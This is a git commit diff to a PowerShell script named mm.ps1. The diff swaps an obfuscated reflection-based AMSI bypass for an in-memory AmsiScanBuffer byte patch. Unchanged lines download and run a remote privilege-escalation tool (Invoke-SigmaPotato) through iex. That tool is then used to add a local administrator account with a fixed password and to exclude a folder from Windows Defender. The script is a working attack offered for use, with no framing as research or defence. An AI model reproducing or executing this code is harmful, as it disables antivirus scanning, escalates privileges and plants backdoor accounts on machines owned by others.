6e7fe2e44372e336ae67964fab6c319a98ebe52d
farzas1 <eightfarzad@gmail.com>
2025-09-26 09:30:18 +0330

    Update mm.ps1

--- mm.ps1
+++ mm.ps1
@@ -1,9 +1,36 @@
-#Matt Graebers Reflection method 
-$k7BPsnMX=$null;$eiykkQrIgm6b9zP="System.$(('Mãnägêmè'+'nt').normaLiZe([CHaR]([ByTE]0x46)+[cHAR](111)+[ChaR]([BYTE]0x72)+[chaR]([BYte]0x6d)+[CHaR]([ByTe]0x44)) -replace [chaR]([Byte]0x5c)+[chAR](112*45/45)+[cHaR](123+16-16)+[Char](77*14/14)+[CHAr]([bYTe]0x6e)+[ChaR]([byTE]0x7d)).$(('Äùtómá'+'tîón').NOrmAliZE([CHAR]([bytE]0x46)+[CHAR](111)+[cHar]([BYte]0x72)+[chAR]([byTE]0x6d)+[cHAr]([bYTe]0x44)) -replace [char]([ByTe]0x5c)+[chAR](112)+[chaR](123*32/32)+[ChAR]([bYte]0x4d)+[CHar](110)+[cHaR](49+76)).$(('Ä'+'m'+'s'+'ì'+'Ú'+'t'+'î'+'l'+'s').norMaLizE([chAr]([ByTE]0x46)+[CHar]([byTe]0x6f)+[Char]([bYTe]0x72)+[CHAR](109+97-97)+[ChAr]([BYtE]0x44)) -replace [ChAR]([BYtE]0x5c)+[CHAR]([byTe]0x70)+[cHaR](123+18-18)+[Char](63+14)+[cHAr]([Byte]0x6e)+[ChAR](125))";$pksfk="+('gd'+'wû'+'sf'+'qí'+'ì').NormALIZE([ChAR]([bYTE]0x46)+[cHar](41+70)+[ChAR](114+85-85)+[cHAR]([bYTe]0x6d)+[chAR](68*11/11)) -replace [CHaR]([bYte]0x5c)+[ChaR]([ByTE]0x70)+[CHAR](123+93-93)+[cHAr](77+51-51)+[ChAr](110+71-71)+[CHar](13+112)";[Threading.Thread]::Sleep(1858);[Ref].Assembly.GetType($eiykkQrIgm6b9zP).GetField($([cHAR]([bYte]0x61)+[CHar](109)+[CHar]([bYtE]0x73)+[CHAR]([Byte]0x69)+[CHAr](73+62-62)+[CHAr](110*99/99)+[chAr]([bYTe]0x69)+[cHAR](116*83/83)+[cHar]([bYte]0x46)+[chAR]([bytE]0x61)+[cHAr](105*32/32)+[cHAR](59+49)+[char](101)+[CHAr](100+81-81)),"NonPublic,Static").SetValue($k7BPsnMX,$true);$p="+[chAr](116*32/32)+[Char](113+8)+[cHAr]([BYTE]0x67)+[cHaR]([ByTE]0x71)+[ChaR](16+95)";[Threading.Thread]::Sleep(440)
+#Rasta-mouses Amsi-Scan-Buffer patch \n
+$qMY8oUk_OtSOeSLZ = @"
+using System;
+using System.Runtime.InteropServices;
+public class qMY8oUk_OtSOeSLZ {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr XJnopb56xvr, string kc1PPgGpZWE7jMIpzGYO);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr Zhj, UIntPtr PHIVX0aivw5XfhjKY, uint Klev_iH, out uint W6BwMDMnXCxqPcPCB);
+}
+"@
+
+Add-Type $qMY8oUk_OtSOeSLZ
+
+$y60l2g7Vq8YIUSeZl = [qMY8oUk_OtSOeSLZ]::LoadLibrary("$(('ámsì.d'+'ll').NormAliZE([chAr]([byTe]0x46)+[chAr]([bYte]0x6f)+[chAr](114+72-72)+[CHAr]([bYTe]0x6d)+[CHaR](68+43-43)) -replace [CHar](92*70/70)+[chAr]([BYtE]0x70)+[chaR]([bYTe]0x7b)+[cHAr](77+16-16)+[ChaR](110*19/19)+[cHAr]([bYTE]0x7d))")
+$VWpMpfsN3S = [qMY8oUk_OtSOeSLZ]::GetProcAddress($y60l2g7Vq8YIUSeZl, "$(('ÂmsíS'+'cânBù'+'ffêr').NOrMALIZE([Char]([byte]0x46)+[ChAr]([BytE]0x6f)+[CHAR]([bYtE]0x72)+[ChAR]([bYTE]0x6d)+[cHAr](5+63)) -replace [cHar](92+7-7)+[CHar]([bYtE]0x70)+[ChaR](22+101)+[char]([BYte]0x4d)+[CHaR]([bYTE]0x6e)+[Char](125+94-94))")
+$p = 0
+[qMY8oUk_OtSOeSLZ]::VirtualProtect($VWpMpfsN3S, [uint32]5, 0x40, [ref]$p)
+$g0TSlV = "0xB8"
+$hm_d = "0x57"
+$uTsTgdc2fbPQe9hZp25 = "0x00"
+$zP_zLHIZVJqCkOB065pQ = "0x07"
+$bQqQoSsNdqUP = "0x80"
+$aBhINi = "0xC3"
+$x8Q = [Byte[]] ($g0TSlV,$hm_d,$uTsTgdc2fbPQe9hZp25,$zP_zLHIZVJqCkOB065pQ,+$bQqQoSsNdqUP,+$aBhINi)
+[System.Runtime.InteropServices.Marshal]::Copy($x8Q, 0, $VWpMpfsN3S, 6)
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
 Invoke-SigmaPotato -command "net user k kopq@123 /add"
 Invoke-SigmaPotato -command "net localgroup administrators k /add"
 Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
+
 
 
 
